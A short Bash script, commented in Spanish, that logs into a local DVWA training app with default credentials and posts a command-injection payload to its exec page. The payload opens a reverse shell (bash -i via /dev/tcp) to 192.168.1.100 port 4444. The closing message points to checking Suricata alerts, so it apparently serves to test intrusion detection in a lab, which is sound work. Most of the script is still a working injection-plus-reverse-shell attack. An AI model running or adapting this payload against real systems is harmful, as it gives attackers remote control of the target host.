#!/bin/bash


# Configuración de DVWA
BASE_URL="http://localhost:4280"
LOGIN_URL="$BASE_URL/login.php"
EXEC_URL="$BASE_URL/vulnerabilities/exec/"
USERNAME="admin"
PASSWORD="password"


# Configuración de payload malicioso
PAYLOAD="ip=; bash -i >& /dev/tcp/192.168.1.100/4444 0>&1&submit=Submit"


# Archivo temporal para cookies
COOKIE_FILE="dvwa_cookies.txt"


# Paso 1: Iniciar sesión en DVWA
echo "Iniciando sesión en DVWA..."$LOGIN_URL
curl -s -c $COOKIE_FILE -d "username=$USERNAME&password=$PASSWORD&Login=Login" "$LOGIN_URL"


# Paso 2: Enviar el payload malicioso
echo "Enviando payload malicioso..."
curl -s -b $COOKIE_FILE -X POST "$EXEC_URL" \
   -H "Content-Type: application/x-www-form-urlencoded" \
   --data "$PAYLOAD"


# Limpieza
rm -f $COOKIE_FILE
echo "Prueba completada. Verifica las alertas en Suricata."
